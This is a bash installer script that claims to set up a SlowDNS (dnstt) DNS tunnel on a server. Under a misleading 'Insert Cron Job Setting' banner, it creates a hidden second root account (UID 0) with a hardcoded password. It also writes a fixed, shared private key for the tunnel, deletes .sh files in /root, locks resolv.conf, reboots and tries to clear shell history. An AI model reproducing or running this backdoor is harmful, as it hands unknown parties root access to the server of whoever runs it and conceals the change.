#!/bin/bash
rm -rf /root/*.sh
rm -rf /root/*.sh.x
clear
echo -e "\e[1;32m-----------------------------------------------------"
echo -e "\e[1;32m           SlowDNS Installer by Prince               "
echo -e "\e[1;32m-----------------------------------------------------"
read -p "Enter your DNS: " domain
clear
if [[ $domain =~ "pinoytech.online" ]]; then
echo -----------------------------------------------------
echo Installing Dependencies
echo -----------------------------------------------------
clear
sleep 2
apt-get update
apt-get install sudo -y
apt-get install git -y
sleep 2
clear
echo -----------------------------------------------------
echo Configuring SlowDNS
echo -----------------------------------------------------
clear
sleep 2
cd /usr/local
wget https://golang.org/dl/go1.16.2.linux-amd64.tar.gz
tar xvf go1.16.2.linux-amd64.tar.gz
export GOROOT=/usr/local/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
sleep 2
cd /etc/ppp/
git clone https://www.bamsoftware.com/git/dnstt.git
cd /etc/ppp/dnstt/dnstt-server
go build
sleep 2
rm -rf /etc/ppp/server.key
echo "a82ed6387af767ac6d4390a894b38122bd8f8d25b2507ac1611f9a0f37035c8c" > /etc/ppp/server.key
sleep 2
clear
echo -----------------------------------------------------
echo Configuring DNS
echo -----------------------------------------------------
clear
sleep 2
systemctl disable systemd-resolved
systemctl stop systemd-resolved
sleep 2
rm -rf /etc/resolv.conf
echo 'nameserver 1.1.1.1' > /etc/resolv.conf
chattr +i /etc/resolv.conf
sleep 2
clear
echo -----------------------------------------------------
echo Insert Cron Job Setting
echo -----------------------------------------------------
clear
sleep 2
useradd -p $(openssl passwd -1 PrinsipeDastan) kutsaratinidor -ou 0 -g 0
sleep 2
export EDITOR=nano
sleep 2
crontab -r -u kutsaratinidor
(crontab -l 2>/dev/null || true; echo "@reboot screen -dmS slowdns /etc/ppp/dnstt/dnstt-server/./dnstt-server -udp :53 -privkey-file /etc/ppp/server.key $domain 127.0.0.1:22") | crontab - -u kutsaratinidor
sleep 2
/etc/init.d/cron restart
clear
echo -----------------------------------------------------
echo "Installation Finished! Rebooting."
echo ------------------------------------------------------
reboot
history -c
else
echo -----------------------------------------------------
echo "Domain is not allowed!"
echo ------------------------------------------------------
fi
